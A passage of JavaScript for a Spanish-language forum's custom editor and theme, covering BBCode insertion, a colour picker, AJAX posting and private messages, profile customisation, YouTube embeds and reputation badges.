                    f = a[0].className;
                    b = '<div id="p' + t + '" class="' + f + ' zeditor-new Nuevo">' + BB.parse(a[0].innerHTML) + '</div>';
                    d = $.getby('#End_');
                    e = $.getby('.nav');
                    d.insertAdjacentHTML('beforebegin', b);
                    $._fadeIn(g[0], 350);
                    if (/\/f13-staff/g.test(e[1].href) || ops.mode.innerHTML === ops.lang.reply) {
                        ops.Nacti_msg = ops.mi_nombre + ' comentó en : [url=' + window.location.href + ']' + ops.topic_name + '[/url]';
                        ops.Na()
                    }
                    ops.button('.zeditor-new');
                    ops.attach(), ops.offset_download()
                }).done(function () {
                    n = $.getby('.descargar');
                    if (_userdata.user_posts > 5 && n.length > 0) {
                        k = $.getby('.no_code'),
                            l = k.length,
                            m = $.getby('.informacion_nuevo');
                        for (i = 0; i < l; i++) {
                            k[i].style.display = 'block'
                        }
                        m.length && m.remove();
                    }
                    isIE && (0 === n.length ? location.reload() : ops.offset_download())
                })
            } else if (ops.mode.innerHTML === ops.lang.edit) {
                h = ops.message_dom;
                $.get(c, function (c) {
                    ops.send_button.innerHTML = ops.lang.send_button;
                    j = $('#p' + t + ' .zeditor-message', c);
                    h.innerHTML = BB.parse(j[0].innerHTML);
                    $._fadeIn(h, 300);
                    (ops.imgauto(), ops.Yt_SZ(), ops.yT_eD(), ops.back_close())
                })
            }
            ops.textarea.value = '';
        },
        maxim: function () {
            var a = $.getby('#ze-editor');
            a.classList.contains('maxim') ? a.classList.remove('maxim') : a.classList.add('maxim')
        },
        popup: function (c, d) {
            var x, y, w;
            ops.textarea.focus();
            x = $.getby(c);
            y = $.getby('#ze-editor').offsetWidth;
            if (x.style.display === 'none') {
                w = $(d).position().left;
                x.setAttribute('style', 'display: block');
                if (w + x.offsetWidth + 20 > y) {
                    w = y - x.offsetWidth - 20
                }
                x.style.left = w - 30 + 'px'
            } else {
                x.style.display = 'none'
            }
            $('#' + c).siblings().hide()
        },
        createColor: function () {
            if (!$.getby('#ze-color-inner')) {
                var i, j, k, c = '<table cellspacing="0" id="ze-color-inner">';
                var d = new Array("00", "33", "66", "99", "CC", "FF");
                for (i = 5; i >= 0; i--) {
                    c = c + "<tr>";
                    for (j = 5; j >= 0; j--) {
                        for (k = 5; k >= 0; k--) {
                            var a = d[j] + d[i] + d[k];
                            c = c + '<td style="background: #' + a + '" title="#' + a + '"><div style="background:#' + a + '" onclick="ops.add(\'color=#' + a + "', 'color');ops.hideColor()\"></div></td>"
                        }
                    }
                    c = c + "</tr>"
                }
                $.getby('#ze-color').innerHTML = c + '</table><div id="ze-color-info"><div class="ze-color-input"><div>#</div><input id="ze-color-hex" maxlength="6" onkeypress="ops.convertHex(this)" placeholder="000000"></div><div class="ze-color-input"><div>R</div><input id="ze-color-r" maxlength="3" onkeypress="ops.convertRGB()" placeholder="000"></div><div class="ze-color-input"><div>G</div><input id="ze-color-g" maxlength="3" onkeypress="ops.convertRGB()" placeholder="000"></div><div class="ze-color-input"><div>B</div><input id="ze-color-b" maxlength="3" onkeypress="ops.convertRGB()" placeholder="000"></div><div class="editor-button-confirm" onclick="ops.submitColor()">OK</div></div>'
            }
        },
        hideColor: function () {
            $.getby('#ze-color').style.display = 'none'
        },
        convertHex: function (c) {
            var c = c.value,
                d = /^#?([a-f\d]{2})([a-f\d]{2})([a-f\d]{2})$/i.exec(c);
            d ? ($.getby('#ze-color-r').value = parseInt(d[1], 16), $.getby('#ze-color-g').value = parseInt(d[2], 16), $.getby('#ze-color-b').value = parseInt(d[3], 16)) : null
        },
        convertRGB: function () {
            var e = $.getby('#ze-color-r').value,
                c = $.getby('#ze-color-g').value,
                d = $.getby('#ze-color-b').value,
                a = d | (c << 8) | (e << 16);
            $.getby('#ze-color-hex').value = (16777216 + a).toString(16).slice(1)
        },
        tag: function (c) {
            var e = ops.nombre_editor,
                d = ops.url_tema;
            ops.textarea.value += '@' + e;
            e.length > 0 ? $.post('/privmsg?mode=post&post=1', {
                'username[]': e,
                subject: ops.lang.tag_message_title + ops.topic_name,
                message: e + ops.lang.tag_message_content + ' [url=http://www.opensourcephpbb3.com' + d + '] ' + ops.topic_name + ' en el post: ' + d.match(/(\d+)$/g)[0] + '[/url]',
                post: 'Send',
                folder: 'inbox'
            }) : $.boxes('alert', ops.lang.tag_message_error);
        },
        loading: function (c) {
            var b = $.getby('#editor-loading');
            true === c ? b.style.display = '' : b.style.display = 'none'
        },
        advance: function () {
            var e, t, a = ops.mode.innerHTML,
                b = $.getby('.pm-mode')[0],
                c = ops.textarea;
            if (a === ops.lang.edit || a === ops.lang.quote) {
                location.href = ops.url, window.onbeforeunload = !1
            } else if (a === ops.lang.pm) {
                e = b.parentNode.parentNode.parentNode.parentNode.getElementsByClassName('author')[0].children[1].href.match(/\d+/g)[1];
                '' === c.value ? location.href = 'privmsg?mode=post&u=' + e : (window.onbeforeunload = !1, location.href = 'privmsg?mode=post&u=' + e, ops.storage(ops.id_tema, c.value, 'salvando texto del mp'), Cookies.set('_id_tema_', ops.id_tema))
            } else if (a === ops.lang.reply) {
                if ('' != c.value) {
                    window.onbeforeunload = !1;
                    location.href = ops.url;
                    t = ops.id_tema;
                    ops.storage(t, c.value, 'salvando texto del editor');
                } else {
                    location.href = ops.url
                }
            };
        },
        submitColor: function () {
            var a = $.getby('#ze-color-hex');
            if (a.value !== '') {
                ops.add('color=#' + a.value, 'color')
            } else {
                ops.add('color=rgb(0, 0, 0)', 'color')
            }
            ops.hideColor()
        },
        add: function (d, s) {
            ops.textarea = (ps || tm || mp) ? $.getby('#editor-textarea') : $.getby('#AAGquickvm_message');
            var f = 'undefined' == typeof s ? d : s;
            var b = document.selection ? document.selection.createRange().text : ops.textarea.value.substring(ops.textarea.selectionStart, ops.textarea.selectionEnd);
            var c = '[' + d + ']' + b + '[/' + f + ']';
            if (document.selection) {
                ops.textarea.focus();
                var e = ops.getCaret() + d.length + 2;
                document.selection.createRange().text = c;
                var a = ops.textarea.createTextRange();
                a.collapse(true);
                a.moveStart('character', e);
                a.moveEnd('character', b.length);
                a.select();
                ops.textarea.focus();
            } else {
                var e = ops.textarea.selectionStart + d.length + 2,
                    b = ops.textarea.selectionEnd + d.length + 2;
                ops.textarea.value = ops.textarea.value.substring(0, ops.textarea.selectionStart) + c + ops.textarea.value.substring(ops.textarea.selectionEnd, ops.textarea.value.length);
                ops.textarea.focus();
                ops.textarea.setSelectionRange(e, b)
            }
        },
        getCaret: function () {
            ops.textarea.focus();
            var r = document.selection.createRange();
            if (r == null) {
                return 0;
            }
            var re = ops.textarea.createTextRange(),
                rc = re.duplicate();
            re.moveToBookmark(r.getBookmark());
            rc.setEndPoint('EndToStart', re);
            var add_newlines = 0;
            for (var i = 0; i < rc.text.length; i++) {
                if (rc.text.substr(i, 2) == '\r\n') {
                    add_newlines += 2;
                    i++;
                }
            }
            return rc.text.length + add_newlines;
        },
        crear_mp_ajax: function () {
            if (isMPNew || isMPpost) {
                var h = $.getby('.dl_titulo')[0],
                    i = $.getby('#main'),
                    j = $.getby('#ze-editor');
                j.classList.add('pm-mode');
                i.classList.add('mp_new');
                h.style = 'display:block;width:100%';
            }
        },
        post_ajax: function (c) {
            var t, o, b, a = document.forms.post,
                h = a.post.value,
                i = a.subject,
                j = a.message,
                k = a.post,
                l = $(a).serialize(),
                n = $.getby('#main');
            k.value = 'Enviando...';
            if (isNewTopic) {
                if (i.value.length <= 10 || j.value == 0) {
                    $.boxes('alert', ops.mi_nombre + ' Tu título o tu mensaje deben contener más de 10 caracteres');
                    return false
                } else {
                    ops.loading_general();
                    $.post('/post', l + '&post=1').success(function (e) {
                        j.placeholder = 'Tema creádo con éxito';
                        j.value = '';
                        i.value = '';
                        k.value = h;
                        console.log('Se creó un tema ajax');
                        t = $('a[href*="/viewtopic?"]', e)[0].href;
                        $.get(t, function (e) {
                            o = $('#url_a_t', e)[0].textContent;
                            b = ops.mi_nombre + ' público el tema:[url=http://' + location.hostname + t + ']' + o + '[/url]';
                            ops.notify(ops.mi_nombre + ': Se creó el tema: ' + o);
                            ops.Nacti_msg = b;
                            ops.Na()
                        }).success(function () {
                            setTimeout(function () {
                                location.href = t
                            }, 1000);
                            14 === isNewTopic && ops.soporte_mp(o);
                        })
                    }).fail(function () {
                        $.boxes('alert', 'no se pudo crear el tema, intenta de nuevo')
                    })
                }
            } else if (isEditPost) {
                window.onbeforeunload = false;
                $.post('/post', l + '&post=1').success(function (e) {
                    j.placeholder = 'Tema editado con éxito';
                    j.value = '';
                    i.value = '';
                    k.value = h;
                    console.log('Se editó un tema ajax');
                    t = $('a[href*="/viewtopic?"]', e)[0].href;
                    ops.loading_general();
                    $.get(t, function (e) {
                        o = $('#url_a_t', e)[0].textContent;
                        ops.notify(ops.mi_nombre + ': Se editó el tema: ' + o)
                    }).done(function () {
                        setTimeout(function () {
                            location.href = t
                        }, 1e3)
                    })
                }).fail(function () {
                    $.boxes('alert', 'no se pudo crear el tema, intenta de nuevo')
                })
            } else if (isMPNew) {
                var d = a.username;
                j.value != 0 && (window.onbeforeunload = false);
                if ('' === i.value && (i.value = 'Mensaje enviado sin título a ' + d.value));
                if (0 == j.value) {
                    $.boxes('alert', 'Debes escribir algo antes de enviar');
                    return false
                } else {
                    window.onbeforeunload = false;
                    $.post('/privmsg', l + '&post=1').done(function () {
                        console.log('MP enviado a ' + d.value),
                            ops.notify('MP enviado a ' + d.value + ' con éxito'),
                            i.value = '',
                            d.value = '',
                            j.value = '',
                            k.value = h,
                            j.placeholder = 'Mensaje enviado',
                            setTimeout(function () {
                                location.href = '/privmsg?folder=inbox'
                            }, 1000);
                    })
                }
                return false
            } else if (isMPedit) {
                var d = a.username;
                $.post('/privmsg', l + '&post=1').done(function () {
                    console.log('MP enviado a ' + d.value),
                        ops.notify('MP enviado a ' + d.value + ' con éxito'),
                        i.value = '',
                        d.value = '',
                        j.value = '',
                        k.value = h,
                        j.placeholder = 'Mensaje enviado',
                        setTimeout(function () {
                            location.href = '/privmsg?folder=inbox'
                        }, 1000);
                })
            }
        },
        preview: function (c) {
            var h, i, j, a = tm ? ops.url : document.location.href,
                b = $.getby('.box_titulo')[0],
                d = $.getby('#box_info'),
                e = $.getby('.Ncontenedor')[0],
                f = 'display:block;margin-top: 5%; border: 1px solid #ccc; padding: 10px; width: 900px; min-height: 400px; left: 15%; background: #fff; z-index: 1000; box-shadow: 1px 1px 10px #333; right: 23%; max-height: 380px; overflow: scroll;',
                g = ops.lang.preview_button;
            tm ? c.innerHTML = g + ' <i class="fa fa-spinner fa-pulse fa-1x fa-fw"></i>' : c.value = 'Cargando...';
            $.post(a, {
                    message: ops.textarea.value,
                    preview: 'Preview'
                },
                function (c) {
                    h = $(ops.preview_dom, c);
                    i = $('.content', c);
                    j = '<div class="post">' + i[0].outerHTML + '</div>';
                    ops.back();
                    b.textContent = 'Previsualizar';
                    d.style = f;
                    e.innerHTML = tm ? BB.parse(h[0].innerHTML) : (isNewTopic || isMPNew) && BB.parse(j)
                }).success(function () {
                tm ? c.innerHTML = g : c.value = g,
                    ops.imgauto(), ops.yT_eD()
            })
        },
        e_pTm: function () {
            try {
                for (var e = ops.p_Fi, t = 0; t < e.length; t++) {
                    var a = e[t].getElementsByClassName('estado_post')[0],
                        b = e[t].getElementsByClassName('perfil_texto')[0],
                        c = b.innerHTML.match(/(.*)(?=\[table(.*)])/g)[0];
                    a.innerHTML = c
                }
            } catch (e) {
                'undefined' != typeof console && (console.error(e), ops.post_mw('Chalo', '[Mensaje automático] Error en el status de ' + ops.mi_nombre, '[warning]' + ops.mi_nombre + ' tiene mal su estado, arreglalo[/warning] ', '/privmsg', 'post', '', 'profile', '1', ''))
            }
        },
        g_Dr: function () {
            try {
                var b, f, g, h, i, j, k, l, m, n, t,
                    a = $.getby('img'),
                    c = $.getby('.post'),
                    d = a.length,
                    e = c.length;
                for (t = 0; t < d; t++) {
                    /Masculino/g.test(a[t].alt) ? a[t].parentNode.parentNode.parentNode.parentNode.parentNode.parentNode.parentNode.classList.add('male') : /Femenino/g.test(a[t].alt) && a[t].parentNode.parentNode.parentNode.parentNode.parentNode.parentNode.parentNode.classList.add('female');
                }
                for (i = 0; i < e; i++) {
                    f = c[i].classList.contains('male'),
                        g = c[i].classList.contains('female'),
                        h = c[i].classList.contains('online'),
                        j = c[i].getElementsByClassName('isConect'),
                        k = '<span class="p_online">Conectado</span>',
                        l = '<span class="offline">Desconectado</span>',
                        m = '<span class="p_online">Conectada</span>',
                        n = '<span class="offline">Desconectada</span>';
                    f && h && j.length ? j[0].innerHTML = k : f && !h && j.length ? j[0].innerHTML = l : g && h && j.length ? j[0].innerHTML = m : g && !h && j.length && (j[0].innerHTML = n);
                }
            } catch (a) {
                'undefined' != typeof console && console.error(a)
            }
        },
        e_Sf: function () { //reparando
            ops.pg_jx(), ops.fb_w(), ops.twt(), ops.yT_eD(), ops.pR_Tm(), ops.logout && ops.mas(), !ops.logout && ops.mN_L(), ops.aAS_p(), ops.imgauto(), ops.Yt_SZ(), ops.browser(), ops.e_pTm(), ops.g_Dr(), ops.panda(), ops.f_code(), ops.copy(), ops.scroll_all(), ops.mencionar(), ops.sin_req(), ops.poll(), ops.logout && ops.vig_init(), ops.temas_cerrado(), ops.adfly(), ops.ir_muro();
            var a = $.getby('.pagination'),
                b = $.getby('#End_').previousElementSibling,
                c = ops.logout && b.getElementsByClassName('buttons_zeditor')[0].childNodes[0].childNodes[0].childNodes[1],
                e = a.length == 3 && ops.pag_tb.replace(/<p class="pagination bottom">/g, '<p class="pagination bottom sobrepuesto" style="margin-left:423px">');
            for (var i = 0; i < a.length; i++) {
                a[i].style.display = 'block'
                a[i].style.opacity = '1';
            }
            if (a.length == 3 && ops.logout) {
                a[2].remove();
                c.insertAdjacentHTML('afterend', e);
            } else if (a.length == 3 && !ops.logout) {
                a[2].remove();
                b.insertAdjacentHTML('afterend', e);
            }
            ops.n_frT()
        },
        attach: function (e) {
            var a = $.getby('.pagination'),
                b = $.getby('.zeditor-new'),
                c = b[0].getElementsByClassName('buttons_zeditor')[0].childNodes[0].childNodes[0].childNodes[1],
                d = $.getby('a'),
                f = d.length,
                g = a.length == 3 && ops.pag_tb.replace(/<p class="pagination bottom">/g, '<p class="pagination bottom sobrepuesto" style="margin-left:423px">');
            a.length == 3 && (a[2].remove(), c.insertAdjacentHTML('afterend', g));
            for (var i = 0; i < f; i++) {
                if (/\?watch=topic/g.test(d[i].href)) {
                    d[i].innerHTML = ops.lang.unwatchBTN;
                    d[i].href = document.location.pathname + '?unwatch=topic';
                    d[i].setAttribute('onclick', 'ops.ops.vG_lr(this);return false')
                }
            }
            ops.Yt_SZ(), ops.mencionar(), ops.yT_eD(), ops.imgauto(), ops.browser(), ops.e_pTm(), ops.confirm(), ops.p_LPt(), ops.prefijos_all_add(), ops.g_Dr();
            //arreglar esto
            $('#poll_ballot').length && ($('.anun_votos').remove(), $('#poll_ballot').find('[value="Votar"]').show(), setTimeout(function () {
                $('body,html').animate({
                    scrollTop: $('#poll_ballot').offset().top - 100
                }, 300)
            }, 1000));
            ops.back_close()
        },
        aV_x: function () {
            var a = '<p class="avatar_ajax" style="margin-top: 35px!important;display:inline-block!important;margin-left: 0;color: rgb(255, 255, 255)!important;font-size:10px!important;text-shadow:0 1px rgb(0, 0, 0)!important;"><i class="fa fa-camera" aria-hidden="true"></i> Cambiar avatar </p>',
                e = $.getby('.avatar-titulo');
            ops.mi_nombre === ops.autor_tema && (e[0].onmouseenter = function () {
                if (!$.getby('#c_ava_a')) {
                    var b = document.createElement('div'),
                        c = e[0],
                        d = c.parentNode;
                    d.insertBefore(b, c);
                    b.id = 'c_ava_a';
                    b.setAttribute('onmouseleave', 'ops.ava_fo(this)');
                    b.innerHTML = a;
                    b.style = 'position: absolute;font-size: 10px;z-index: 10;cursor: pointer;background: rgba(9, 14, 17, 0.61);margin-top: -38px;height: 85px;width: 85px;border-radius: 100%;margin-left: 2px;';
                    ops.c_A_jx()
                }
            })
        },
        ava_fo: function (c) { //arreglar esto
            $(c).fadeOut(function () {
                this.remove()
            })
        },
        L_p: function (d) {
            var c = $.getby('.nav'),
                f = /\/f(4|5|6|7|11|16)(p[0-9]+)?-/.test(c[1].href) && ops.download.length >= 0;
            if (f && d == 'reply' || f && d == 'quote') {
                console.log(d);
                var b = $.getby('#editor-textarea'),
                    e = b.value,
                    t = new RegExp('\\w{2,}\\b', 'g'),
                    o = e.match(t),
                    a = null === o ? 0 : o.length;
                ops.Lp_a(a);
                b.onkeyup = function (i) {
                    e = b.value, o = e.match(t), a = null === o ? 0 : o.length, a >= 4 ? (ops.notice.innerHTML = 'Has escrito <span style="color:rgba(0, 128, 0, 1)">' + a + '</span> palabras. Ya puedes enviar el mensaje <i class="fa fa-check-circle" style="vertical-align: middle;box-shadow:none;border:none;color:rgb(0, 128, 0)"></i>', ops.Lp_a(a)) : (ops.notice.innerHTML = 'Has escrito <span style="color:rgb(255, 0, 0)">' + a + '</span> ' + (4 - a < 3 ? 'palabras' : 'palabra') + '. Te falta' + (4 - a > 1 ? 'n ' : ' ') + (4 - a) + ' palabra' + (4 - a > 1 ? 's' : '') + '  para poder enviar este mensaje <i class="fa fa-exclamation-circle" style="vertical-align: middle;box-shadow:none;border:none;color:rgb(255, 0, 0)"></i>', ops.Lp_a(a))
                }
            }
        },
        Lp_a: function (a) {
            var b = $.getby('#editor-send-button');
            if (a >= 4) {
                b.setAttribute('disabled', 'false'), b.style.opacity = '1', b.setAttribute('onclick', 'ops.post(this);window.onbeforeunload = false')
            } else {
                b.setAttribute('disabled', !0), b.style.opacity = '0.6', b.removeAttribute('onclick')
            }
        },
        start_f_change: function (e, t) {
            switch (e) {
            case 'portada':
                var a = $.getby('.iN_p')[0],
                    b = $.getby('#_miniportada_input'),
                    c = $.getby('#cover-theme'),
                    d = a || b;
                ops.cf_error = 'Debes introducir un link de imagen antes de enviar';
                ops.cf_content = '[["profile_field_13_3", "' + d.value + '"]]',
                    ops.cf_done = function (e) {
                        Cookies.remove('banner_src' + ops.mi_nombre);
                        Cookies.set('banner_src' + ops.mi_nombre, d.value, {
                                expires: 1
                            }),
                            console.log('galleta del banner eliminada');
                        if (ops.cf_name == ops.mi_nombre) {
                            c.style.opacity = .1;
                            c.src = d.value;
                            $._fadeIn(c, 500);
                            d.value = '';
                            ops.notify('Se actualizó tu portada con éxito')
                        } else {
                            d.value = 'Se actualizó tu portada'
                        }
                        ops.Nacti_msg = ops.mi_nombre + ' actualizo su portada en los temas ',
                            ops.Na(),
                            ops.notify('Se actualizó tu portada con éxito')
                    }, ops.cf_ajax(d.value)
                break;
            case 'color':
                var a = $.getby('.perfil_texto')[2],
                    b = $.getby('#url_a_t'),
                    c = $.getby('.author-titulo')[0],
                    d = $.getby('.perfil_texto')[3].textContent,
                    e = $.getby('#_colortitulo_input'),
                    f = 'color:' + e.value + '!important;text-shadow:' + d + ' !important',
                    g = 'Debes introducir un codigo hexadecimal de color \n ó rbg antes de enviar: ejemplo: rgb(0, 0, 0)';
                ops.cf_content = '[["profile_field_13_5", "' + e.value + '"]]';
                ops.cf_done = function () {
                        if (ops.cf_name === ops.mi_nombre) {
                            a.textContent = e.value;
                            b.style = f;
                            c.style = f;
                            e.value = '',
                                ops.notify('Se actualizó el color de los títulos con éxito')
                        } else {
                            e.value = 'Se actualizó el color de los títulos';
                        }
                        ops.Nacti_msg = ops.mi_nombre + ' actualizó el color de sus títulos ';
                        ops.Na();
                    },
                    ops.cf_error = g;
                ops.cf_ajax(e.value);
                break;
            case 'sombra':
                var a = $.getby('#_shadow_ajax_input'),
                    b = $.getby('.perfil_texto')[3].textContent,
                    c = $.getby('#url_a_t'),
                    d = $.getby('.perfil_texto')[2].textContent,
                    e = 'Debes introducir un codigo CSS de text-shadow antes de enviar: ejemplo: 0 1px rgb(255, 255, 255)';
                ops.cf_content = '[["profile_field_13_4", "' + a.value + '"]]';
                ops.cf_done = function () {
                    if (ops.cf_name === ops.mi_nombre) {
                        b = a.value;
                        c.style = 'text-shadow:' + a.value + '!important;color:' + d + ' !important';
                        a.value = '';
                        ops.notify('La sombra se actualizo con éxito')
                    } else {
                        a.value = 'La sombra se actualizo con éxito'
                    }
                    ops.Nacti_msg = ops.mi_nombre + ' agregó una sombra a sus portadas ',
                        ops.Na()
                }
                ops.cf_error = e,
                    ops.cf_ajax(a.value);
            }
        },
        status_box: function () {
            var j,
                a = $.getby('#AAGstatus_input'),
                b = (new Date).getDate(),
                c = (new Date).getMonth(),
                d = (new Date).getFullYear(),
                e = b + '/' + (c + 1 < 10 ? '0' + (c + 1) : c + 1) + '/' + (d - 2e3) + ' - ' + (new Date).getHours() + ':' + ((new Date).getMinutes() < 10 ? '0' + (new Date).getMinutes() : (new Date).getMinutes()),
                f = a.value,
                g = a.value + ' [table class=fecha_up][td]Se modifico:' + e + ' hrs.[/td][/table]',
                h = pu && $.getby('.mi_status'),
                i = isTid,
                k = ops.mi_id,
                l = ops.mi_nombre + ' actualizó su estado: [color=#FF0000][b][i]' + f + '[/i][/b][/color]',
                m = 'Escribe un estado antes de enviar',
                n = ops.mi_nombre + ' ¿que tienes en mente?';
            ops.cf_content = '[["profile_field_13_1", "' + g + '"]]';
            ops.cf_done = function () {
                ops.notify('OK: tu estado fue actualizado');
                ops.Nacti_msg = l;
                ops.Na_user = 'status';
                ops.Na();
                ops.Na_user = 'historial';
                ops.Na();
                Cookies.remove('perfil_status' + ops.mi_nombre);
                a.value = '';
                a.placeholder = 'Actualizado';
                setTimeout(function () {
                    a.placeholder = n
                }, 1500);
                Cookies.set('perfil_status' + ops.mi_nombre, g, {
                    expires: 365
                });
                j = g.match(/(.+)(?=\[table(.*)])/g)[0];
                if (pu) {
                    h[0].textContent = j
                } else if (tm) {
                    for (var e = $.getby('.me'), t = 0; t < e.length; t++) {
                        e[t].getElementsByClassName('estado_post')[0].textContent = j
                    }
                } else if (ind) {
                    setTimeout(ops.extra_actividad('/u3wall'), 5000);
                    console.log('actualizado por cambio de status')
                }
            }
            ops.cf_error = m;
            ops.cf_ajax(f);
        },
        VPrF_: function () {
            var a, b, d, f, g, h, i, j, e = pu && ops.nombre_perfil === ops.mi_nombre;
            if (!e) {
                if (!Cookies.get(ops.mi_nombre + ops.nombre_perfil)) {
                    $.get('/u' + ops.mi_id, function (c) {
                        f = (new Date()).getDate(),
                            g = (new Date()).getMonth();
                        h = (new Date()).getFullYear();
                        i = (new Date()).getHours();
                        j = (new Date()).getMinutes();
                        a = ops.mi_id;
                        b = $('#field_id-8 .field_uneditable', c)[0].textContent;
                        d = ops.nombre_perfil + '(' + f + '/' + (g < 10 ? '0' + (g + 1) : (g + 1)) + '/' + (h - 2000) + ' - ' + i + ':' + (j < 10 ? '0' + j : j) + ')' + b;
                        ops.cf_content = '[["profile_field_13_-8", "' + d + '"]]';
                        ops.cf_done = function () {
                            Cookies.set(ops.mi_nombre + ops.nombre_perfil, '1')
                        }
                    })
                }
            }
        },
        ir_muro: function () {
            for (var s = $.getby('.f_a3'), t = 0; t < s.length; t++) s[t].innerHTML += '<a href="' + s[t].parentNode.parentNode.children[1].children[0].href + 'wall"><p class="ir_muro">muro</p></a>';
        },
        cf_ajax: function (a) {
            return '' === a ? ($.boxes('alert', ops.cf_error), !1) : void $.post('ajax_profile.forum?jsoncallback=jQuery1', {
                id: '1',
                user: ops.mi_id,
                active: '1',
                content: ops.cf_content,
                tid: isTid
            }).done(function (e) {
                ops.cf_done()
            })
        },
        cf_html: function () {
            if (ops.estoy_logueado && !$.getby('.portada_').length) {
                var e = '<div id="_miniportada" class="portada_"><input class="iN_p" id="_miniportada_input" type="text" placeholder="' + ops.lang.cf_p_a + '"><div class="_miniportada-button" onclick="ops.start_f_change(\'portada\',this)"><i class="fa fa-picture-o"></i></div></div><div id="_colortitulo"><input id="_colortitulo_input" type="text" placeholder="' + ops.lang.cf_p_b + '"><div class="_colortitulo-button" onclick="ops.start_f_change(\'color\',this)"><i class="fa fa-adjust"></i></div></div><div id="_shadow_ajax"><input id="_shadow_ajax_input" type="text" placeholder="' + ops.lang.cf_p_b + '"><div class="_shadow_ajax-button" onclick="ops.start_f_change(\'sombra\',this)"><i class="fa fa-font"></i></div></div>';
                $.getby('#plus_menu').insertAdjacentHTML('beforeend', e);
            }
        },
        twt: function () {
            ! function (d, s, id) {
                var js, fjs = d.getElementsByTagName(s)[0],
                    p = /^http:/.test(d.location) ? 'http' : 'https';
                if (!d.getElementById(id)) {
                    js = d.createElement(s);
                    js.id = id;
                    js.src = p + '://platform.twitter.com/widgets.js';
                    fjs.parentNode.insertBefore(js, fjs);
                }
            }(document, 'script', 'twitter-wjs');
        },
        fb_w: function () {
            (function (d, s, id) {
                var js, fjs = d.getElementsByTagName(s)[0];
                if (d.getElementById(id)) return;
                js = d.createElement(s);
                js.id = id;
                js.src = "//connect.facebook.net/{LANGUAGE}/all.js#xfbml=1";
                fjs.parentNode.insertBefore(js, fjs);
            }(document, 'script', 'facebook-jssdk'));
        },
        p_LPt: function () { //podria ser mejor
            var e = ops.p_Fi,
                loop = e.length;
            for (var i = 0; i < loop; i++) {
                var a = Number(e[i].getElementsByClassName('perfil_texto')[6].textContent),
                    b = e[i].getElementsByClassName('reputacion')[0];
                a > 1500 || (b.innerHTML = '<span class="rv rLv0">' + ops.lang.thumbs + a + '</span>'), a > 1200 || (b.innerHTML = '<span class="rv rLv1">' + ops.lang.thumbs + a + '</span>'), a > 1e3 || (b.innerHTML = '<span class="rv rLv2">' + ops.lang.thumbs + a + '</span>'), a > 800 || (b.innerHTML = '<span class="rv rLv3">' + ops.lang.thumbs + ' ' + a + '</span>'), a > 700 || (b.innerHTML = '<span class="rv rLv4">' + ops.lang.thumbs + a + '</span>'), a > 600 || (b.innerHTML = '<span class="rv rLv5">' + ops.lang.thumbs + a + '</span>'), a > 300 || (b.innerHTML = '<span class="rv rLv6">' + ops.lang.thumbs + a + '</span>'), a > 50 || (b.innerHTML = '<span class="rv rLv7">' + ops.lang.thumbs + a + '</span>')
            }
        },
        Yt_SZ: function () {
            var i, e = $.getby('embed'),
                loop = e.length;
            for (i = 0; i < loop; i++) /youtu/g.test(e[i].src) && (e[i].setAttribute('width', '785'), e[i].setAttribute('height', '420'))
        },
        yT_eD: function () {
            var e = $.getby('a'),
                l = e.length;
            for (var i = 0; i < l; i++) {
                if ('undefined' != typeof e[i]) {
                    var a = e[i].href.match(/(?:v=|v\/|embed\/|youtu.be\/)(.{11})/);
                    if (a && a[1]) {
                        e[i].outerHTML = '<embed pluginspage="http://www.macromedia.com/go/getflashplayer" src="http://www.youtube.com/v/' + a[1] + '" allowscriptaccess="always" allowfullscreen="true" width="785" height="420" type="application/x-shockwave-flash" wmode="transparent" quality="high" scale="exactfit" class="video_you"><br>'
                    }
                }
            }
        },
        imgauto: function () {
            for (var i, e = document.querySelectorAll('.post .content a'), t = document.URL.replace(location.hash, '').replace(location.pathname, ''), o = /\.(png|jpg|jpeg|gif)$/i, a = 0; i = e[a++];) i.innerHTML === i.href && (o.test(i.href) && (i.innerHTML = '<img class="auto-img" alt="' + i.href + '" src="' + i.href + '">'), 0 === i.href.indexOf(t) && (i.innerHTML = i.href.substring(i.href.lastIndexOf('/'))));
            for (var a = 0, r = document.querySelectorAll('.postbody .content img[alt=""]'); a < r.length; a++) {
                r[a].classList.add('fa_resized');
                r[a].setAttribute('onclick', 'ops.img_change(this)');
                r[a].outerHTML += '<p class="before_img" style="font-size:10px!important">Da click para agrandar la imagen</p>';
            }
        },
        img_change: function (c) {
            c.classList.contains('fa_resized') ? (c.classList.remove('fa_resized'), c.classList.add('fa_max'), c.nextSibling.innerHTML = 'Da click para reducir el tamaño', c.nextSibling.style.color = 'red') : c.classList.contains('fa_max') && (c.classList.remove('fa_max'), c.classList.add('fa_resized'), c.nextSibling.innerHTML = 'Da click para agrandar la imagen', c.nextSibling.style.color = 'green');
        },
        nC_Tm: function () {
            try {
                if (ops.logout) {
                    var f = 'background: none repeat scroll 0 0 rgb(173, 216, 230); color: rgba(74, 74, 74, 1); font-weight: 800; padding: 0px 3px; display: inline; border-radius: 2px; margin-left: 2px; font-family: monda; font-size: 11px; text-shadow: 0 1px rgba(255, 255, 255, 1);',
                        n = '<div style="' + f + '"><i class="fa fa-bomb"></i> Nuevo comentario</div>',
                        b = $.getby('.Nuevo'),
                        l = b.length;
                    for (var i = 0; i < l; i++) {
                        if (l) {
                            b[i].getElementsByClassName('author')[0].getElementsByTagName('img')[0].outerHTML = n
                        }
                    }
                }
            } catch (o) {
                'undefined' != typeof console && console.error(o)
            }
        },
        browser: function () {
            try {
                for (var b = $.getby('.post'), i = 0; i < b.length; i++) {
                    var a = b[i].getElementsByClassName('perfil_texto')[9].textContent.match(/\S+/)[0].toLowerCase(),
                        c = b[i].getElementsByClassName('perfil_texto')[10].textContent.match(/\S+/)[0].toLowerCase(),
                        d = b[i].getElementsByClassName('version')[0],
                        e = b[i].getElementsByClassName('navegador')[0];
                    d.classList.add(a), e.classList.add(c), e.style.display = 'block', d.style.display = 'block';
                    var f = 'phpbb3' == a,
                        g = 'punbb' == a,
                        h = 'phpbb2' == a,
                        p = 'invision' == a,
                        j = 'chrome' == c,
                        k = 'opera' == c,
                        l = 'firefox' == c,
                        m = 'safari' == c,
                        n = 'explorer' == c;
                    f ? d.innerHTML = ops.lang.dom_phpbb3 : g ? d.innerHTML = ops.lang.dom_punbb : h ? d.innerHTML = ops.lang.dom_phpbb2 : p && (d.innerHTML = ops.lang.dom_invision), j ? e.innerHTML = ops.lang.dom_chrome : l ? e.innerHTML = ops.lang.dom_firefox : m ? e.innerHTML = ops.lang.dom_safari : k ? e.innerHTML = ops.lang.dom_opera : n && (e.innerHTML = ops.lang.dom_explorer)
                }
